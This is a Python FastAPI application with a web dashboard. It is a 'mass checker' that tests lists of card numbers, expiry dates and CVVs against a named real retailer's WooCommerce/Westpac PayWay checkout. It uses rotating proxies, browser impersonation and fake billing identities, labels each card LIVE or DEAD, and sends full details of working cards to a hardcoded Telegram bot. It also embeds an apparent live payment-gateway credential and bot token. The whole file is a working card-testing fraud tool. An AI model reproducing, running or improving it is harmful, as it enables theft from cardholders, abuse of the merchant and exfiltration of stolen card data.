# app.py
# Python 3.11 - 3.14 | Run: pip fastapi uvicorn curl_cffi python-multipart
from __future__ import annotations

import asyncio
import json
import random
import re
import time
from dataclasses import dataclass
from typing import Any, Final
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from curl_cffi.requests import AsyncSession, Response

app = FastAPI(title="WooCommerce Westpac PayWay Web Checker")

# ============================================================================
# CONFIG BLOCK
# ============================================================================
TARGET_BASE: Final[str] = "https://www.accesseducation.com.au"
CHECKOUT_PATH: Final[str] = "/checkout/"
FORCED_PRODUCT_ID: Final[str | None] = "1551"
PAYMENT_GATEWAY_SLUG: Final[str] = "westpac_payway_net"
FORCED_PAYWAY_AUTH: Final[str] = (
    "Basic UTE0NDMzX1BVQl9oNDlmcXB4c2hleWp2bW5zNGp6ZWVlN3RiOTY0aXdha3RiaXVwanJhN3BxaHhnMm5wOWF6MmFzZW01bTU6"
)
TELEGRAM_BOT_TOKEN: Final[str] = "8716620633:AAGD2-O_2E-ZKm3HPTaTyu3o4uc1u5GLR1M"
TELEGRAM_CHAT_ID: Final[str] = "6516330870"
ENABLE_TELEGRAM_ALERTS: Final[bool] = True

CHECKOUT_URL: Final[str] = f"{TARGET_BASE.rstrip('/')}{CHECKOUT_PATH}"
CART_URL: Final[str] = f"{TARGET_BASE.rstrip('/')}/cart/"

NONCE_RE: Final[re.Pattern[str]] = re.compile(
    r'name="woocommerce-process-checkout-nonce"\s+value="([a-f0-9]+)"'
    r'|update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']',
    re.IGNORECASE,
)
GATEWAY_RADIO_RE: Final[re.Pattern[str]] = re.compile(
    r'name="payment_method"[^>]*value="([^"]+)"|value="([^"]+)"[^>]*name="payment_method"',
    re.IGNORECASE,
)


@dataclass(frozen=True, slots=True)
class Card:
    number: str
    month: str
    year: str
    cvv: str
    raw: str

    @property
    def short_year(self) -> str:
        return self.year[-2:] if len(self.year) == 4 else self.year


@dataclass(frozen=True, slots=True)
class CheckResult:
    card: Card
    status: str
    reason: str
    latency_ms: float


def verify_luhn(card_number: str) -> bool:
    if not card_number.isdigit() or not (13 <= len(card_number) <= 19):
        return False
    checksum = 0
    for idx, digit in enumerate(map(int, reversed(card_number))):
        if idx % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def parse_card_line(line: str) -> Card | None:
    clean = line.strip()
    if not clean or clean.startswith("#"):
        return None
    parts = re.split(r"[|:/\\\s]+", clean)
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if not verify_luhn(cc) or not (1 <= int(mm) <= 12):
        return None
    return Card(number=cc, month=mm, year=yy, cvv=cvv, raw=clean)


class TelegramNotifier:
    @staticmethod
    async def send_alert(text: str) -> None:
        if not ENABLE_TELEGRAM_ALERTS or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            return
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
        try:
            async with AsyncSession(impersonate="chrome120") as s:
                await s.post(url, json=payload, timeout=5)
        except Exception:
            pass


class BillingProfile:
    FIRST_NAMES: Final[tuple[str, ...]] = ("Liam", "Noah", "Oliver", "James", "Lucas", "Jack", "Harrison")
    LAST_NAMES: Final[tuple[str, ...]] = ("Smith", "Jones", "Williams", "Brown", "Wilson", "Taylor", "Davies")
    STREETS: Final[tuple[str, ...]] = ("142 Collins St", "88 Pitt St", "210 Queen St", "45 Bourke St")
    CITIES: Final[tuple[tuple[str, str, str], ...]] = (
        ("Melbourne", "VIC", "3000"),
        ("Sydney", "NSW", "2000"),
        ("Brisbane", "QLD", "4000"),
    )

    @classmethod
    def generate(cls) -> dict[str, str]:
        fname = random.choice(cls.FIRST_NAMES)
        lname = random.choice(cls.LAST_NAMES)
        city, state, postcode = random.choice(cls.CITIES)
        rand_num = random.randint(1000, 9999)
        return {
            "billing_first_name": fname,
            "billing_last_name": lname,
            "billing_company": "Access Student",
            "billing_country": "AU",
            "billing_address_1": random.choice(cls.STREETS),
            "billing_address_2": "",
            "billing_city": city,
            "billing_state": state,
            "billing_postcode": postcode,
            "billing_phone": f"04{random.randint(10000000, 99999999)}",
            "billing_email": f"{fname.lower()}.{lname.lower()}{rand_num}@gmail.com",
            "shipping_first_name": fname,
            "shipping_last_name": lname,
            "shipping_company": "Access Student",
            "shipping_country": "AU",
            "shipping_address_1": random.choice(cls.STREETS),
            "shipping_address_2": "",
            "shipping_city": city,
            "shipping_state": state,
            "shipping_postcode": postcode,
        }


class GatewayClassifier:
    LIVE_PATTERNS: Final[tuple[str, ...]] = (
        "insufficient funds",
        "insufficient_funds",
        "not sufficient funds",  # <-- Captured as LIVE hit
        "security code is incorrect",
        "incorrect_cvc",
        "cvc check failed",
        "cvv2 mismatch",
        "invalid cvc",
        "do not honor",
        "transaction not allowed",
        "authentication_required",
        "requires_action",
        "order-received",
        '"result":"success"',
    )
    DEAD_PATTERNS: Final[tuple[str, ...]] = (
        "card was declined", "generic_decline", "invalid_number", "expired_card",
        "pickup_card", "lost_card", "stolen_card", "fraudulent", "card_declined",
        "invalid account", "no such issuer", "invalid card number", "declined",
        "error processing checkout", "invalid card number (no such number)", "do not honour",
    )

    @classmethod
    def classify(cls, raw_body: str) -> tuple[str, str]:
        lower_body = raw_body.lower()
        reason_excerpt = "Unmapped gateway response"
        clean_msg = re.sub(r"<[^>]+>", " ", raw_body).strip()
        clean_msg = re.sub(r"\s+", " ", clean_msg)
        if clean_msg:
            reason_excerpt = clean_msg[:140]

        if "single use token" in lower_body or ("token" in lower_body and "provide" in lower_body):
            return "ERROR", f"Integration Misconfiguration: {reason_excerpt}"

        try:
            data: dict[str, Any] = json.loads(raw_body)
            redirect = str(data.get("redirect", ""))
            messages = str(data.get("messages", ""))
            result_flag = str(data.get("result", ""))
            msg_clean = re.sub(r"<[^>]+>", " ", messages).strip()
            if msg_clean:
                reason_excerpt = msg_clean[:140]
            if result_flag == "success" or "order-received" in redirect:
                return "LIVE", f"Charged / 3DS Redirect -> {redirect[:60]}"
        except ValueError:
            pass

        for pat in cls.LIVE_PATTERNS:
            if pat in lower_body:
                return "LIVE", f"Matched [{pat}] | {reason_excerpt}"
        for pat in cls.DEAD_PATTERNS:
            if pat in lower_body:
                return "DEAD", f"Matched [{pat}] | {reason_excerpt}"
        return "DEAD", reason_excerpt


class WooCommerceChecker:
    def __init__(self, proxies: list[str], max_concurrency: int = 8) -> None:
        self.proxies = proxies
        self.semaphore = asyncio.Semaphore(max_concurrency)

    def _pick_proxy(self) -> str | None:
        return random.choice(self.proxies) if self.proxies else None

    async def check_card(self, card: Card) -> CheckResult:
        t0 = time.perf_counter()
        proxy = self._pick_proxy()

        async with self.semaphore:
            for attempt in range(2):
                if attempt > 0:
                    proxy = self._pick_proxy()

                try:
                    async with AsyncSession(impersonate="chrome120", proxy=proxy, verify=True) as session:
                        await session.get(CART_URL, timeout=8)
                        if FORCED_PRODUCT_ID:
                            await session.get(CART_URL, params={"add-to-cart": FORCED_PRODUCT_ID, "quantity": "1"}, timeout=8)
                        chk_resp = await session.get(CHECKOUT_URL, timeout=8)
                        nonce_m = NONCE_RE.search(chk_resp.text)
                        nonce = (nonce_m.group(1) or nonce_m.group(2)) if nonce_m else None
                        if not nonce:
                            if attempt < 1:
                                continue
                            return CheckResult(card=card, status="ERROR", reason="Missing checkout nonce", latency_ms=(time.perf_counter() - t0) * 1000.0)

                        billing = BillingProfile.generate()

                        token_headers = {
                            "Authorization": FORCED_PAYWAY_AUTH,
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Accept": "application/json, text/plain, */*",
                            "Origin": TARGET_BASE,
                            "Referer": CHECKOUT_URL,
                        }
                        token_payload = {
                            "paymentMethod": "creditCard",
                            "connectionType": "FRAME",
                            "cardholderName": f"{billing['billing_first_name']} {billing['billing_last_name']}",
                            "cardNumber": card.number,
                            "expiryDateMonth": card.month,
                            "expiryDateYear": card.short_year,
                            "cvn": card.cvv,
                            "threeDS2": "false",
                        }
                        t_resp = await session.post("https://api.payway.com.au/rest/v1/single-use-tokens", headers=token_headers, data=token_payload, timeout=8)
                        try:
                            t_data = t_resp.json()
                        except ValueError:
                            return CheckResult(card=card, status="ERROR", reason=f"PayWay HTML Block: {t_resp.text[:80]}", latency_ms=(time.perf_counter() - t0) * 1000.0)
                        
                        if "singleUseTokenId" not in t_data:
                            err = t_data.get("error", {})
                            msg = err.get("message", t_resp.text[:120])
                            status, reason = GatewayClassifier.classify(msg)
                            return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)

                        token_id = str(t_data["singleUseTokenId"])

                        form_data = {
                            **billing,
                            "order_comments": "",
                            "payment_method": PAYMENT_GATEWAY_SLUG,
                            "woocommerce-process-checkout-nonce": nonce,
                            "_wp_http_referer": CHECKOUT_PATH,
                            "terms": "on",
                            "terms-field": "1",
                            "westpac-token": token_id,
                            "singleUseTokenId": token_id,
                            "payway_single_use_token_id": token_id,
                        }
                        post_resp = await session.post(f"{TARGET_BASE.rstrip('/')}/?wc-ajax=checkout", data=form_data, headers={"Origin": TARGET_BASE, "Referer": CHECKOUT_URL, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
                        status, reason = GatewayClassifier.classify(post_resp.text)
                        
                        if status == "LIVE":
                            asyncio.create_task(TelegramNotifier.send_alert(f"<b>🔥 WEB HIT 🔥</b>\n💳 <code>{card.raw}</code>\n💬 <code>{reason}</code>"))

                        return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
                except Exception as exc:
                    if attempt == 1:
                        return CheckResult(card=card, status="ERROR", reason=str(exc), latency_ms=(time.perf_counter() - t0) * 1000.0)
                    await asyncio.sleep(0.5)

        return CheckResult(card=card, status="ERROR", reason="Max retries reached", latency_ms=(time.perf_counter() - t0) * 1000.0)


# ============================================================================
# WEB DASHBOARD INTERFACE (HTML / CSS / JS)
# ============================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WooCommerce PayWay Web Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 font-sans min-h-screen p-6">
    <div class="max-w-5xl mx-auto space-y-6">
        <header class="border-b border-slate-800 pb-4 flex justify-between items-center">
            <h1 class="text-2xl font-bold tracking-wider text-emerald-400">⚡ WESTPAC PAYWAY MASS CHECKER</h1>
            <span class="text-xs bg-emerald-900/50 text-emerald-300 px-3 py-1 rounded-full border border-emerald-700">Online & Active</span>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <!-- Input Form Card -->
            <div class="bg-slate-900 border border-slate-800 p-5 rounded-xl shadow-lg space-y-4">
                <div class="flex border-b border-slate-800 pb-2 space-x-4">
                    <button onclick="switchTab('single')" id="tabSingle" class="text-sm font-semibold text-emerald-400 border-b-2 border-emerald-400 pb-1">Single Check</button>
                    <button onclick="switchTab('mass')" id="tabMass" class="text-sm font-semibold text-slate-400 pb-1">Mass / Bulk Check</button>
                </div>

                <!-- Single Form -->
                <form id="singleForm" class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Card (CC|MM|YYYY|CVV)</label>
                        <input type="text" id="singleCard" placeholder="4111222233334444|08|2028|123" required
                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Proxy (Optional)</label>
                        <input type="text" id="singleProxy" placeholder="http://user:pass@host:port"
                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
                    </div>
                    <button type="submit" id="singleBtn"
                        class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-2.5 rounded-lg transition duration-200 shadow-md">
                        Check Single Card
                    </button>
                </form>

                <!-- Mass Form -->
                <form id="massForm" class="space-y-4 hidden">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Cards List (One per line)</label>
                        <textarea id="massCards" rows="6" placeholder="4111222233334444|08|2028|123&#10;5455122802892688|10|2029|045" required
                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Proxies List (One per line, optional)</label>
                        <textarea id="massProxies" rows="3" placeholder="http://ip:port&#10;http://user:pass@ip:port"
                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Concurrency Threads</label>
                        <input type="number" id="massThreads" value="8" min="1" max="25"
                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
                    </div>
                    <button type="submit" id="massBtn"
                        class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-2.5 rounded-lg transition duration-200 shadow-md">
                        Start Mass Check
                    </button>
                </form>
            </div>

            <!-- Results Panel -->
            <div class="bg-slate-900 border border-slate-800 p-5 rounded-xl shadow-lg flex flex-col justify-between">
                <div>
                    <div class="flex justify-between items-center mb-3">
                        <h2 class="text-lg font-semibold text-slate-300">Live Result Output</h2>
                        <button onclick="clearLogs()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded">Clear</button>
                    </div>
                    <div id="resultBox" class="bg-slate-950 border border-slate-800 rounded-lg p-4 h-96 overflow-y-auto font-mono text-xs space-y-2 text-slate-400">
                        <span>[*] Ready for requests...</span>
                    </div>
                </div>
                <div class="text-right text-xs text-slate-500 pt-3 border-t border-slate-800">
                    Engine: Asyncio + curl_cffi (Chrome 120 TLS)
                </div>
            </div>
        </div>
    </div>

    <script>
        function switchTab(mode) {
            const singleForm = document.getElementById('singleForm');
            const massForm = document.getElementById('massForm');
            const tabSingle = document.getElementById('tabSingle');
            const tabMass = document.getElementById('tabMass');

            if (mode === 'single') {
                singleForm.classList.remove('hidden');
                massForm.classList.add('hidden');
                tabSingle.className = "text-sm font-semibold text-emerald-400 border-b-2 border-emerald-400 pb-1";
                tabMass.className = "text-sm font-semibold text-slate-400 pb-1";
            } else {
                massForm.classList.remove('hidden');
                singleForm.classList.add('hidden');
                tabMass.className = "text-sm font-semibold text-emerald-400 border-b-2 border-emerald-400 pb-1";
                tabSingle.className = "text-sm font-semibold text-slate-400 pb-1";
            }
        }

        function clearLogs() {
            document.getElementById('resultBox').innerHTML = '<span>[*] Cleared output log.</span>';
        }

        const resultBox = document.getElementById('resultBox');

        // Single Check Handler
        document.getElementById('singleForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('singleBtn');
            btn.disabled = true;
            btn.textContent = 'Checking...';

            const card = document.getElementById('singleCard').value;
            const proxy = document.getElementById('singleProxy').value;

            resultBox.innerHTML += `<div class="text-yellow-400">[*] Checking single card: ${card}</div>`;

            try {
                const response = await fetch('/api/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `card=${encodeURIComponent(card)}&proxy=${encodeURIComponent(proxy)}`
                });
                
                if (!response.ok) {
                    throw new Error(`Server error: ${response.status} ${response.statusText}`);
                }

                const data = await response.json();
                appendResult(data);
            } catch (err) {
                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Request failed: ${err.message}</div>`;
            }

            btn.disabled = false;
            btn.textContent = 'Check Single Card';
            resultBox.scrollTop = resultBox.scrollHeight;
        });

        // Mass Check Handler
        document.getElementById('massForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('massBtn');
            btn.disabled = true;
            btn.textContent = 'Mass Checking...';

            const cards = document.getElementById('massCards').value;
            const proxies = document.getElementById('massProxies').value;
            const threads = document.getElementById('massThreads').value;

            resultBox.innerHTML += `<div class="text-yellow-400">[*] Starting mass check session...</div>`;

            try {
                const response = await fetch('/api/mass-check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `cards=${encodeURIComponent(cards)}&proxies=${encodeURIComponent(proxies)}&threads=${encodeURIComponent(threads)}`
                });

                if (!response.ok) {
                    throw new Error(`Server error: ${response.status} ${response.statusText}`);
                }

                const results = await response.json();
                results.forEach(res => appendResult(res));
                resultBox.innerHTML += `<div class="text-emerald-400">[*] Mass check completed! Processed ${results.length} cards.</div>`;
            } catch (err) {
                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Mass check failed: ${err.message}</div>`;
            }

            btn.disabled = false;
            btn.textContent = 'Start Mass Check';
            resultBox.scrollTop = resultBox.scrollHeight;
        });

        function appendResult(data) {
            let color = 'text-slate-300';
            const latency = (data.latency_ms !== undefined && !isNaN(data.latency_ms)) ? data.latency_ms.toFixed(0) : '0';
            
            if (data.status === 'LIVE') color = 'text-emerald-400 font-bold';
            else if (data.status === 'DEAD') color = 'text-rose-400';
            else if (data.status === 'ERROR') color = 'text-amber-400';

            resultBox.innerHTML += `<div class="${color}">[${data.status}] ${data.card} -> ${data.reason} (${latency}ms)</div>`;
        }
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def index() -> str:
    return HTML_TEMPLATE

@app.post("/api/check")
async def api_check(card: str = Form(...), proxy: str = Form("")) -> dict[str, Any]:
    try:
        parsed_card = parse_card_line(card)
        if not parsed_card:
            return {"card": card, "status": "ERROR", "reason": "Invalid card format or failed Luhn check", "latency_ms": 0}

        proxies_list = [proxy.strip()] if proxy and proxy.strip() else []
        checker = WooCommerceChecker(proxies=proxies_list, max_concurrency=1)
        res = await checker.check_card(parsed_card)
        return {"card": res.card.raw, "status": res.status, "reason": res.reason, "latency_ms": res.latency_ms}
    except Exception as e:
        return {"card": card, "status": "ERROR", "reason": f"Server Exception: {str(e)}", "latency_ms": 0}

@app.post("/api/mass-check")
async def api_mass_check(cards: str = Form(...), proxies: str = Form(""), threads: int = Form(8)) -> list[dict[str, Any]]:
    try:
        parsed_cards = [parse_card_line(l) for l in cards.splitlines() if parse_card_line(l)]
        parsed_proxies = [p.strip() for p in proxies.splitlines() if p.strip() and not p.strip().startswith("#")]

        if not parsed_cards:
            return [{"card": "N/A", "status": "ERROR", "reason": "No valid Luhn cards provided", "latency_ms": 0}]

        checker = WooCommerceChecker(proxies=parsed_proxies, max_concurrency=threads)
        
        tasks = [checker.check_card(c) for c in parsed_cards]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        output = []
        for r in results:
            if isinstance(r, Exception):
                output.append({"card": "Unknown", "status": "ERROR", "reason": str(r), "latency_ms": 0})
            else:
                output.append({
                    "card": r.card.raw,
                    "status": r.status,
                    "reason": r.reason,
                    "latency_ms": r.latency_ms,
                })
        return output
    except Exception as e:
        return [{"card": "N/A", "status": "ERROR", "reason": f"Mass Check Exception: {str(e)}", "latency_ms": 0}]

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=True)
